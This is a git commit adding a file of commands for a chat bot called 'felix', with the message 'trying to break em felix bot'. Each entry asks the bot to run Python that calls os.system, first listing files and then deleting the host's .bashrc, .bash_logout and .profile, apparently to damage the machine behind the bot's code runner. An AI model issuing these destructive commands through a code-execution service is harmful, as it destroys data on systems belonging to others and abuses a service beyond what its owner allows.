18c440aba405bb8b0a3a91fde3a6ccc2eed3e14e
Derek Willingham <derek@DWILLIN-APC.APC.WIN>
2018-10-11 18:02:08 -0400

    trying to break em felix bot

---
+++ src/em_break_felix.py
@@ -0,0 +1,33 @@
+felix run python3
+```
+import os
+
+
+```
+----------------------------------------------
+felix run python3
+```
+import os
+
+print(os.system('ls -la'))
+```
+----------------------------------------------
+felix run python3
+```
+import os
+
+print(os.system('rm -r .bashrc'))
+```
+
+felix run python3
+```
+import os
+
+print(os.system('ls -la'))
+print(os.system('rm -r .bashrc'))
+print(os.system('rm -r .bash_logout'))
+print(os.system('rm -r .profile'))
+print(os.system('ls -la'))
+print(os.system('exit'))
+print(os.system('top'))
+```
